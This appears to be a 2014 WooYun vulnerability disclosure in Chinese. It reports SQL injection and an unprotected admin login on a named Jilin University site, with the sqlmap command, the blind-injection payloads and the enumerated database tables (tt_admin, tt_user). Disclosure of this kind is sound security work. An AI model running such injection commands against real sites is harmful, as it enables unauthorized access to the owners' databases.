wybug_title: 吉林大学某站点sql注入漏洞及后台未授权访问
wybug_detail:
漏洞详情 披露状态：   									2014-04-23：	细节已通知厂商并且等待厂商处理中									2014-04-24：	厂商已经确认，细节仅向厂商公开									2014-05-04：	细节向核心白帽子及相关领域专家公开									2014-05-14：	细节向普通白帽子公开									2014-05-24：	细节向实习白帽子公开									2014-06-07：	细节向公众公开  简要描述： 吉林大学某站点sql注入漏洞及后台未授权访问 详细说明：  问题站点http://trp.jlu.edu.cn:8000/test2/后台登陆页面形同虚设啊。。。。

   漏洞证明：  再来个SQL注入
D:\sqlmap-master>sqlmap.py -u http://trp.jlu.edu.cn:8000/test2/view.php?id=335 --tables    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 23:31:23[23:31:23] [INFO] resuming back-end DBMS 'mysql'[23:31:23] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=335 AND 5825=5825    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=335 AND SLEEP(5)---[23:31:24] [INFO] the back-end DBMS is MySQLweb server operating system: Windowsweb application technology: Apache 2.2.4, PHP 5.2.1back-end DBMS: MySQL 5.0.11[23:31:24] [INFO] fetching database names[23:31:24] [INFO] fetching number of databases[23:31:24] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[23:31:24] [INFO] retrieved: 2[23:31:27] [INFO] retrieved: information_schema[23:32:15] [INFO] retrieved: news2[23:32:30] [INFO] fetching tables for databases: 'information_schema, news2'[23:32:30] [INFO] fetching number of tables for database 'news2'[23:32:30] [INFO] retrieved: 10[23:32:34] [INFO] retrieved: tt_admin[23:32:57] [INFO] retrieved: tt_bbs[23:33:09] [INFO] retrieved: tt_fileup[23:33:28] [INFO] retrieved: tt_link[23:33:43] [INFO] retrieved: tt_newstable[23:34:11] [INFO] retrieved: tt_sort[23:34:26] [INFO] retrieved: tt_sort2[23:34:34] [INFO] retrieved: tt_temptable[23:35:01] [INFO] retrieved: tt_test[23:35:11] [INFO] retrieved: tt_user
   修复方案：  找做网站的吧   版权声明：转载请注明来源 路人甲@乌云
